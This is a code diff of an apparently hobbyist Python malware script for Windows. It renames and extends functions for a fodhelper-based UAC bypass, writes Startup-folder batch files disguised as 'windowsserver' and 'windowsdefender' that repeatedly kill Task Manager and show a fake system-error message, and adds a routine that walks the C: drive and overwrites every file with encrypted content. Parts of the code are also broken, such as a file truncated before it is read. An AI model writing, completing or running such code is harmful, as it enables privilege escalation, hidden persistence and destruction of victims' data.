@@ -18,7 +18,10 @@ except ImportError:
 
 # Globals
 CC = lambda: os.system('cls' if os.name == 'nt' else 'clear')
-startupDir = (r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' %os.getlogin())
+startupDir = (
+  r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+  % os.getlogin())
+
 
 # Classes
 class crytography_functions:
@@ -397,7 +400,7 @@ class functions():
     # Disable keyboard
     ctypes.windll.user32.DisableProcessWindowsGhosting()
 
-  def UACbypass():
+  def UAC_bypass():
     CMD = r"C:\Windows\System32\cmd.exe"
     FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
     PYTHON_CMD = "python"
@@ -430,8 +433,7 @@ class functions():
       if is_running_as_admin():
         pass
         try:
-          current_dir = os.path.dirname(
-            os.path.realpath(__file__)) + '\\' + __file__
+          current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
           cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
           bypass_uac(cmd)
           os.system(FOD_HELPER)
@@ -444,18 +446,18 @@ class functions():
 
   # ALTERNATIVE BYPASS (TEST zFIRST)
   #def UACbypass():
-    #try:
-      # Get the current value of the UAC
-      #val = ctypes.windll.shell32.IsUserAnAdmin()
-      # Set the UAC to 0 (disabled)
-      #ctypes.windll.shell32.SetUserAccountControl(0)
-      # Return the result
-      #return val
-    #except:
-      #sys.exit(1)
+  #try:
+  # Get the current value of the UAC
+  #val = ctypes.windll.shell32.IsUserAnAdmin()
+  # Set the UAC to 0 (disabled)
+  #ctypes.windll.shell32.SetUserAccountControl(0)
+  # Return the result
+  #return val
+  #except:
+  #sys.exit(1)
 
-  def CPUmuncher():
-    with open(startupDir+'/windowsserver.bat', 'w') as fin:
+  def startup_surprise():
+    with open(startupDir + '/windowsserver.bat', 'w') as fin:
       fin.write('''
 @ECHO OFF
 :infLoop
@@ -464,11 +466,30 @@ tskill Taskmgr
 goto infLoop
       ''')
       fin.close
-    with open(startupDir+'/windowsdefender.bat', 'w') as Fin:
+    with open(startupDir + '/windowsdefender.bat', 'w') as Fin:
       Fin.write('''
 @ECHO OFF
 Do
-msgbox "hello"
+msgbox "Modification of system code or a critical data structure was detected."
 Loop
       ''')
       Fin.close()
+
+  def file_fucker():
+
+    def scanrecurse(baseDir):
+      files = []
+      for r, d, f in os.walk(baseDir):
+        for file in f:
+          filepath = os.path.join(r, file)
+        if os.path.exists(filepath):
+          files.append(os.path.join(r, file))
+      return files
+
+    try:
+      for item in scanrecurse("C:"):
+        with open(item, 'w+') as File:
+          File.write(encryption.standard(item, open(item, 'r').read()))
+          print("Encrypted:", item)
+    except PermissionError:
+      print("Failed encryption:", item)
